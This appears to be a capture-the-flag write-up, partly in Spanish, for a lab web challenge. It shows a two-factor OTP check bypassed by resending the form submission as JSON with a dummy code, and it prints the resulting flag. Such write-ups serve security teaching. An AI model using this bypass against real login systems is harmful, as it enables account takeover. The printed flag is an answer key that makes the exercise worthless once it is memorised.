## Descripción
This website puts a two-factor prompt between you and the flag. Register an account, then take a close look at the requests your browser is actually sending.

[http://xebec.cylabacademy.net:46042/](http://xebec.cylabacademy.net:46042/)

1.- Try using burpsuite to intercept request to capture the flag.

2.- Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.
## Solución
```
Me registré normalmente con el usuario marco en el formulario principal.

Después el sitio redirigió a /dashboard y pidió un código OTP.

La petición normal del OTP usa formulario, pero modifiqué la petición para mandarla como JSON:

POST /dashboard
Accept: application/json
Content-Type: application/json

{"otp":"0000"}

El servidor omitió la validación correcta del OTP y respondió:

Welcome, sebastian you sucessfully bypassed the OTP request.
Your Flag: academy{#0TP_Bypvss_SuCc3$S_007829ce}

academy{#0TP_Bypvss_SuCc3$S_007829ce}
```
```

```

## Notas Adicionales

## Referencias
-- [http://xebec.cylabacademy.net:46042/](http://xebec.cylabacademy.net:46042/)
